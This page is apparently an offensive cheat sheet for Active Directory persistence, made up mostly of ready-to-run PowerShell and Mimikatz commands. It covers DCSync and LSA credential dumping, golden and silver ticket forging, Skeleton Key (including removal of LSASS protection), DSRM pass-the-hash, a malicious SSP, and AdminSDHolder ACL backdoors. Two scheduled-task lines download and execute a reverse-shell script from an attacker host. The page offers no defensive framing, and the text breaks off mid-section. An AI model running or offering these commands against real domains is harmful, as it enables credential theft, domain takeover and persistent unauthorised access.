<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Persistence - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "PERSISTENCE", url: "#_top", children: [
              {title: "DCSync feature for getting krbtgt hash", url: "#dcsync-feature-for-getting-krbtgt-hash" },
              {title: "ACCOUNT DUMPING", url: "#account-dumping" },
              {title: "GOLDEN TICKET", url: "#golden-ticket" },
              {title: "SILVER TICKET", url: "#silver-ticket" },
              {title: "SKELETON KEY", url: "#skeleton-key" },
              {title: "DSRM", url: "#dsrm" },
              {title: "Security Support Provider (SSP)", url: "#security-support-provider-ssp" },
              {title: "ADMINSDHOLDER", url: "#adminsdholder" },
              {title: "CHECK REPLICATION RIGHTS, MODIFY, DCSYNC ATTACK", url: "#check-replication-rights-modify-dcsync-attack" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h2 id="persistence">PERSISTENCE</h2>
<h4 id="dcsync-feature-for-getting-krbtgt-hash">DCSync feature for getting krbtgt hash</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;lsadump::dcsync /user:domain\krbtgt&quot;&#39;</span>
</span></code></pre></div>
<h4 id="account-dumping">ACCOUNT DUMPING</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;lsadump::lsa /patch&quot;&#39;</span> <span class="n">-Computername</span> <span class="n">DC01</span>
</span></code></pre></div>
<hr />
<h4 id="golden-ticket">GOLDEN TICKET</h4>
<p>:information_source: On any machine</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;kerberos::golden /User:Administrator /domain:lab.domain.local /sid:S-1-5-x-x-x-x /krbtgt:00000000000000000000000000000000 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot;&#39;</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="c"># Execute a task to run the reverse shell script</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">S</span> <span class="n">machine</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="nb">SC </span><span class="n">Weekly</span> <span class="p">/</span><span class="n">RU</span> <span class="s2">&quot;NT Authority\SYSTEM&quot;</span> <span class="p">/</span><span class="n">TN</span> <span class="s2">&quot;taskname&quot;</span> <span class="p">/</span><span class="n">TR</span> <span class="s2">&quot;powershell.exe -c &#39;iex(New-Object Net.WebClient).DownloadString(&#39;&#39;http://attackerip/Invoke-PowerShellTcp.ps1&#39;&#39;&#39;)&#39;&quot;</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">Run</span> <span class="p">/</span><span class="n">S</span> <span class="n">machine</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">TN</span> <span class="s2">&quot;taskname&quot;</span>
</span></code></pre></div>
<p>Golden ticket parameters
| Invoke-Mimikatz -Command | Resume |
|---|---|
| kerberos::golden | Name of the module |
| /User:Administrator | Username for which the TGT is generated |
| /domain:lab.domain.local | Domain FQDN |
| /sid:S-1-5-x-x-x-x | SID of the domain |
| /krbtgt:00000000000000000000000000000000 | NTLM (RC4) hash of the krbtgt account. Use /aes128 and /aes256 for using AES keys |
| /id:500 /groups:512 | Optional User RID (default 500) and Group default 513 512 520 518 519) |
| /ptt or /ticket | Injects the ticket in current PowerShell process - no need to save the ticket on disk - Saves the ticket to a file for later use |
| /startoffset:0 | Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future |
| /endin:600 | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |
| /renewmax:10080 | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |</p>
<hr />
<h4 id="silver-ticket">SILVER TICKET</h4>
<ul>
<li>Using hash of the Domain Controller computer account
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;kerberos::golden /domain:lab.domain.local /sid:S-1-5-x-x-x-x /target:DC01.lab.domain.local /service:CIFS /rc4:00000000000000000000000000000000 /user:Administrator /ptt&quot;&#39;</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c"># Generate Silver ticket with machine account Hash - WMI abuse</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;kerberos::golden /domain:target.local /sid:S-1-5-x-x-x-x /target:machine.target.local /service:HOST/rc4:00000000000000000000000000000000 /user:Administrator /ptt&quot;&#39;</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;kerberos::golden /domain:target.local /sid:S-1-5-x-x-x-x /target:machine.target.local /service:RPCSS/rc4:00000000000000000000000000000000 /user:Administrator /ptt&quot;&#39;</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c"># Check WMI</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_operatingsystem</span> <span class="n">-ComputerName</span> <span class="n">machine</span><span class="p">.</span><span class="n">target</span><span class="p">.</span><span class="n">local</span>
</span></code></pre></div></li>
</ul>
<p>Silver ticket parameters
| Invoke-Mimikatz -Command | Resume |
|---|---|
| kerberos::golden | Name of the module (there is no Silver module!) |
| /User:Administrator | Username for which the TGT is generated |
| /domain:lab.domain.local | Domain FQDN |
| /sid:S-1-5-x-x-x-x | SID of the domain |
| /target:DC01.lab.domain.local | Target server FQDN |
| /service:cifs | The SPN name of service for which TGS is to be created |
| /rc4:00000000000000000000000000000000 | NTLM (RC4) hash of the service account. Use /aes128 and /aes256 for using AES keys |
| /id:500 /groups:512 | Optional User RID (default 500) and Group (default 513 512 520 518 519) |
| /ptt | Injects the ticket in current PowerShell process - no need to save the ticket on disk |
| /startoffset:0 | Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future |
| /endin:600 | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |
| /renewmax:10080 | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |</p>
<ul>
<li>Create a silver ticket for the HOST SPN which will allow us to schedule a task
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;kerberos::golden /domain:lab.domain.local /sid:S-1-5-x-x-x-x /target:DC01.lab.dmoain.local /service:HOST /rc4:00000000000000000000000000000000 /user:Administrator /ptt&quot;&#39;</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="c"># CONFIGURE REMOTE TASK</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">S</span> <span class="n">DC01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="nb">SC </span><span class="n">Weekly</span> <span class="p">/</span><span class="n">RU</span> <span class="s2">&quot;NT Authority\SYSTEM&quot;</span> <span class="p">/</span><span class="n">TN</span> <span class="s2">&quot;Abuse01&quot;</span> <span class="p">/</span><span class="n">TR</span> <span class="s2">&quot;powershell.exe -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://10.10.10.10/Invoke-PowerShellTcp.ps1&#39;&#39;&#39;)&#39;&quot;</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c"># EXEC REMOTE TASK</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">Run</span> <span class="p">/</span><span class="n">S</span> <span class="n">DC01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">TN</span> <span class="s2">&quot;Abuse01&quot;</span>
</span></code></pre></div></li>
</ul>
<hr />
<h4 id="skeleton-key">SKELETON KEY</h4>
<p><div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c"># REMOTE</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">DC01</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nb">Enter-PSSession</span> <span class="n">-Session</span> <span class="nv">$sess</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c"># BYPASS AMSI AND EXIT</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="nb">Invoke-Command</span> <span class="n">-FilePath</span> <span class="n">C</span><span class="p">:\</span><span class="nb">Invoke-Mimikatz</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Session</span> <span class="nv">$sess</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="nb">Enter-PSSession</span> <span class="n">-Session</span> <span class="nv">$sess</span>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;privilege::debug&quot; &quot;misc::skeleton&quot;&#39;</span>
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="c"># OR</span>
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;privilege::debug&quot; &quot;misc::skeleton&quot;&#39;</span> <span class="n">-ComputerName</span> <span class="n">DC01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">dmoain</span><span class="p">.</span><span class="n">local</span>
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="c"># LOGIN</span>
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="nb">Enter-PSSession</span> <span class="n">-Computername</span> <span class="n">DC01</span> <span class="n">-credential</span> <span class="n">domain</span><span class="p">\</span><span class="n">Administrator</span>
</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="c"># PASSWORD mimikatz</span>
</span></code></pre></div>
- Skeleton Key with lsass running as a protected process
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">mimikatz</span> <span class="c"># privilege::debug</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">mimikatz</span> <span class="c"># !+</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">mimikatz</span> <span class="c"># !processprotect /process:lsass.exe /remove</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="n">mimikatz</span> <span class="c"># misc::skeleton</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="n">mimikatz</span> <span class="c"># !-</span>
</span></code></pre></div>
:information_source: needs the mimikatz driver (mimidriv.sys) on disk of the target DC</p>
<hr />
<h4 id="dsrm">DSRM</h4>
<ul>
<li>Dump DSRM password (needs DA privs)
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;token::elevate&quot; &quot;lsadump::sam&quot;&#39;</span> <span class="n">-Computername</span> <span class="n">DC01</span>
</span></code></pre></div></li>
<li>Eneable DSRM account to login
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">Enter-PSSession</span> <span class="n">-Computername</span> <span class="n">DC01</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">New-ItemProperty</span> <span class="s2">&quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DsrmAdminLogonBehavior&quot;</span> <span class="n">-Value</span> <span class="n">2</span> <span class="n">-PropertyType</span> <span class="n">DWORD</span>
</span></code></pre></div></li>
<li>Pass the DSRM hash
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="err">&#39;</span><span class="s2">&quot;sekurlsa::pth /domain:DC01 /user:Administrator</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="s2">/ntlm:00000000000000000000000000000000 /run:powershell.exe&quot;</span>
</span></code></pre></div></li>
<li>Dump local acconut
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;lsadump::lsa /patch&quot;&#39;</span> <span class="n">-Computername</span> <span class="n">DC01</span>
</span></code></pre></div></li>
<li>FULL
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">DC01</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nb">Enter-PSSession</span> <span class="n">-Session</span> <span class="nv">$sess</span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c"># BYPASS AMSI AND EXIT</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="nb">Invoke-Command</span> <span class="n">-FilePath</span> <span class="n">C</span><span class="p">:\</span><span class="nb">Invoke-Mimikatz</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Session</span> <span class="nv">$sess</span>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="nb">Enter-PSSession</span> <span class="n">-Session</span> <span class="nv">$sess</span>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;token::elevate&quot; &quot;lsadump::sam&quot;&#39;</span>
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="c"># ALLOW DSRM ADMINISTRATOR TO LOGIN</span>
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="nb">New-ItemProperty</span> <span class="s2">&quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DsrmAdminLogonBehavior&quot;</span> <span class="n">-Value</span> <span class="n">2</span> <span class="n">-PropertyType</span> <span class="n">DWORD</span>
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>
</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="c"># PASS THE HASH DSRM ADMINISTRATOR</span>
</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:00000000000000000000000000000000 /run:powershell.exe&quot;&#39;</span>
</span></code></pre></div></li>
</ul>
<hr />
<h4 id="security-support-provider-ssp">Security Support Provider (SSP)</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c"># Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nv">$packages</span> <span class="p">=</span> <span class="nb">Get-ItemProperty</span>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="n">HKLM</span><span class="p">:\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span><span class="p">\</span><span class="n">OSConfig</span><span class="p">\</span> <span class="n">-Name</span> <span class="s1">&#39;Security Packages&#39;</span><span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="s1">&#39;Security Packages&#39;</span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="nv">$packages</span> <span class="p">+=</span> <span class="s2">&quot;mimilib&quot;</span>
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="nb">Set-ItemProperty</span>
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="n">HKLM</span><span class="p">:\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span><span class="p">\</span><span class="n">OSConfig</span><span class="p">\</span> <span class="n">-Name</span> <span class="s1">&#39;Security Packages&#39;</span> <span class="n">-Value</span> <span class="nv">$packages</span>
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="nb">Set-ItemProperty</span> <span class="n">HKLM</span><span class="p">:\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span><span class="p">\</span> <span class="n">-Name</span> <span class="s1">&#39;Security Packages&#39;</span> <span class="n">-Value</span> <span class="nv">$packages</span>
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>
</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;misc::memssp&quot;&#39;</span>
</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="c"># CHECK C:\Windows\system32\kiwissp.log</span>
</span></code></pre></div>
<hr />
<h4 id="adminsdholder">ADMINSDHOLDER</h4>
<ul>
<li>Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL</li>
</ul>
<table>
<thead>
<tr>
<th>Protected Groups</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Account Operators</td>
<td>Enterprise Admins</td>
</tr>
<tr>
<td>Backup Operators</td>
<td>Domain Controllers</td>
</tr>
<tr>
<td>Server Operators</td>
<td>Read-only Domain Controllers</td>
</tr>
<tr>
<td>Print Operators</td>
<td>Schema Admins</td>
</tr>
<tr>
<td>Domain Admins</td>
<td>Administrators</td>
</tr>
<tr>
<td>Replicator</td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li>Well known abuse</li>
</ul>
<table>
<thead>
<tr>
<th>Groups</th>
<th>Resume</th>
</tr>
</thead>
<tbody>
<tr>
<td>Account Operators</td>
<td>Cannot modify DA/EA/BA groups. Can modify nested group within</td>
</tr>
<tr>
<td>Backup Operators</td>
<td>Backup GPO, edit to add SID of controlled account to a privileged group and Restore</td>
</tr>
<tr>
<td>Server Operators</td>
<td>Run a command as system (using the disabled Browser service)</td>
</tr>
<tr>
<td>Print Operators</td>
<td>Copy ntds.dit backup, load device drivers</td>
</tr>
</tbody>
</table>
<ul>
<li>Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">Add-ObjectAcl</span> <span class="n">-TargetADSprefix</span> <span class="s1">&#39;CN=AdminSDHolder,CN=System&#39;</span> <span class="n">-PrincipalSamAccountName</span> <span class="n">attacker</span> <span class="n">-Rights</span> <span class="n">All</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>Using ActiveDirectory Module and Set-ADACL
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">Set-ADACL</span> <span class="n">-DistinguishedName</span> <span class="s1">&#39;CN=AdminSDHolder,CN=System,DC=test,DC=domain,DC=local&#39;</span> <span class="n">-Principal</span> <span class="n">attacker</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>Interesting permissions (ResetPassword, WriteMembers)
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nb">Add-ObjectAcl</span> <span class="n">-TargetADSprefix</span> <span class="s1">&#39;CN=AdminSDHolder,CN=System&#39;</span> <span class="n">-PrincipalSamAccountName</span> <span class="n">attacker</span> <span class="n">-Rights</span> <span class="n">ResetPassword</span> <span class="n">-Verbose</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="c">#</span>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="nb">Add-ObjectAcl</span> <span class="n">-TargetADSprefix</span> <span class="s1">&#39;CN=AdminSDHolder,CN=System&#39;</span> <span class="n">-PrincipalSamAccountName</span> <span class="n">attacker</span> <span class="n">-Rights</span> <span class="n">WriteMembers</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>Run SDProp manually
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="nb">Import-Module</span> <span class="nb">Invoke-SDPropagator</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="nb">Invoke-SDPropagator</span> <span class="n">-timeoutMinutes</span> <span class="n">1</span> <span class="n">-showProgress</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>Check the Domain Admins permission
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">Get-ObjectAcl</span> <span class="n">-SamAccountName</span> <span class="s2">&quot;Domain Admins&quot;</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-match</span> <span class="s1">&#39;attacker&#39;</span><span class="p">}</span>
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="p">(</span><span class="nb">Get-Acl</span> <span class="n">-Path</span> <span class="s1">&#39;AD:\CN=Domain Admins,CN=Users,DC=lab,DC=domain,DC=local&#39;</span><span class="p">).</span><span class="n">Access</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-match</span> <span class="s1">&#39;attacker&#39;</span><span class="p">}</span>
</span></code></pre></div></li>
<li>Abusing FullControl using PowerView_dev
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nb">Add-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s1">&#39;Domain Admins&#39;</span> <span class="n">-Members</span> <span class="n">attackerda</span> <span class="n">-Verbose</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nb">Add-ADGroupMember</span> <span class="n">-Identity</span> <span class="s1">&#39;Domain Admins&#39;</span> <span class="n">-Members</span> <span class="n">attackerda</span>
</span></code></pre></div></li>
<li>Abusing ResetPassword using PowerView_dev
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="nb">Set-DomainUserPassword</span> <span class="n">-Identity</span> <span class="n">targetaccount</span> <span class="n">-AccountPassword</span> <span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;Password@123&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span> <span class="n">-Verbose</span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="nb">Set-ADAccountPassword</span> <span class="n">-Identity</span> <span class="n">targetaccount</span> <span class="n">-NewPassword</span> <span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;Password@123&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
</ul>
<hr />
<h3 id="check-replication-rights-modify-dcsync-attack">CHECK REPLICATION RIGHTS, MODIFY, DCSYNC ATTACK</h3>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c"># CHECK</span>
